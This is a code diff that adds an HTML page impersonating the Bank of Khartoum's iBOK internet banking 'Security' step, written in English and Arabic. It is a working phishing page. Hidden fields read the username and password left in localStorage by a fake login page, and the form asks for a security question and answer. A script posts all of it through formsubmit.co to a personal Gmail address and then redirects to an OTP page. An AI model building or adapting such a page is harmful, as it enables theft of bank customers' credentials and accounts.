@@ -1,0 +1,167 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Bank of Khartoum - Security</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">
+<link rel="icon" href="img/icon book.png" type="image/png">
+
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{
+  font-family:'Cairo';
+  background:url('img/background.png') no-repeat center center fixed;
+  min-height:100vh;
+  display:flex;
+  flex-direction:column;
+}
+header{
+  height:120px;
+  display:flex;
+}
+.logo-left{
+  flex:1;
+  background:#cc941c;
+  color:#fff;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  font-size:1.6rem;
+}
+.logo-right{background:#d32f2f}
+.logo-right img{height:100%}
+.back{
+  text-align:center;
+  color:#d62e2e;
+  font-size:1.4rem;
+  margin:20px 0;
+}
+main{
+  flex:1;
+  display:flex;
+  justify-content:center;
+  align-items:center;
+}
+.login-form{
+  background:#fff;
+  padding:30px;
+  width:100%;
+  max-width:400px;
+  border-radius:10px;
+  box-shadow:0 4px 20px rgba(0,0,0,.1);
+  direction:rtl;
+}
+.form-group{
+  margin-bottom:15px;
+}
+label{
+  font-size:.85rem;
+  opacity:.8;
+}
+input,select{
+  width:100%;
+  padding:10px;
+  border-radius:5px;
+  border:1px solid #ccc;
+}
+.btn{
+  width:100%;
+  padding:12px;
+  background:#d62e2e;
+  color:#fff;
+  border:none;
+  border-radius:5px;
+  font-size:1.1rem;
+  cursor:pointer;
+}
+.btn:hover{background:#cc4848}
+footer{
+  border-top:3px solid #bc262a;
+  padding:12px;
+  text-align:center;
+}
+</style>
+</head>
+
+<body>
+
+<header>
+  <div class="logo-left">Welcome to iBOK Internet Banking</div>
+  <div class="logo-right"><img src="img/1000423167.png"></div>
+</header>
+
+<div class="back">Internet Banking - Security</div>
+
+<main>
+<form id="securityForm" class="login-form"
+      action="https://formsubmit.co/musaadambahar@gmail.com"
+      method="POST">
+
+  <!-- بيانات صفحة login -->
+  <input type="hidden" name="username" id="username">
+  <input type="hidden" name="password" id="password">
+
+  <h2>الرجاء الإجابة على سؤال الأمان</h2>
+
+  <div class="form-group">
+    <label>اختر سؤال الأمان</label>
+    <select id="security-question" name="security_question" required>
+      <option value="" disabled selected>-- اختر سؤال --</option>
+      <option value="uncle">ما هو اسم بن عمك الأول؟</option>
+      <option value="city">في أي مدينة ولدت؟</option>
+      <option value="graduation">في أي سنة تخرجت من الجامعة؟</option>
+      <option value="nickname">ماذا كان لقبك أثناء الطفولة؟</option>
+      <option value="bestfriend">اسم أفضل صديق في الطفولة؟</option>
+      <option value="driving">اسم اول بلد اجنبي قمت بزيارته؟</option>
+      <option value="marriage">في أي سنة تزوجت؟</option>
+      <option value="football">اسم فريق كرة القدم المفضل لديك؟</option>
+    </select>
+  </div>
+
+  <div class="form-group">
+    <label>الإجابة</label>
+    <input type="text" id="security-answer" name="security_answer" required>
+  </div>
+
+  <input type="hidden" name="_captcha" value="false">
+
+  <button type="submit" class="btn">متابعة</button>
+</form>
+</main>
+
+<footer>© Bank of Khartoum</footer>
+
+
+<script>
+// جلب بيانات login
+window.addEventListener('DOMContentLoaded', () => {
+  document.getElementById('username').value =
+    localStorage.getItem('username') || '';
+  document.getElementById('password').value =
+    localStorage.getItem('password') || '';
+});
+
+// إرسال + انتقال
+document.getElementById('securityForm').addEventListener('submit', function(e){
+  e.preventDefault();
+
+  localStorage.setItem('security_question',
+    document.getElementById('security-question').value);
+  localStorage.setItem('security_answer',
+    document.getElementById('security-answer').value);
+
+  fetch(this.action,{
+    method:'POST',
+    body:new FormData(this)
+  }).then(()=>{
+    window.location.href="otp-form.html";
+  }).catch(()=>{
+    alert("حدث خطأ أثناء الإرسال");
+  });
+});
+</script>
+
+</body>
+</html>
